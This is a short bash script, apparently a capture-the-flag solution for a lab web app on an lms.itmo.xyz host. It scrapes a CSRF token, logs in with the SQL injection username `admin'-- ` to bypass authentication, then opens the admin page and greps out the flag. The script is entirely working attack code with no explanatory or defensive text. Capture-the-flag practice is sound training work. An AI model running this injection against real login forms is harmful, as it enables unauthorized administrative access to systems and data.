#!/usr/bin/env bash
set -euo pipefail
BASE="${1:?usage: $0 https://<instance>-app.web.lms.itmo.xyz}"

jar="$(mktemp)"
html="$(curl -sS --retry 3 --retry-all-errors -c "$jar" "$BASE/")"
csrf="$(printf '%s' "$html" | grep -o 'name="csrf" value="[^"]*"' | sed 's/.*value="//;s/"//')"

curl -sS --retry 3 --retry-all-errors -o /dev/null -b "$jar" -c "$jar" \
  --data-urlencode "csrf=$csrf" \
  --data-urlencode "username=admin'-- " \
  --data-urlencode "password=x" \
  "$BASE/login" -w "login: %{http_code} -> %{redirect_url}\n"

curl -sS --retry 3 --retry-all-errors -L -b "$jar" "$BASE/admin" \
  | grep -o '<pre class="flag"[^>]*>[^<]*</pre>'
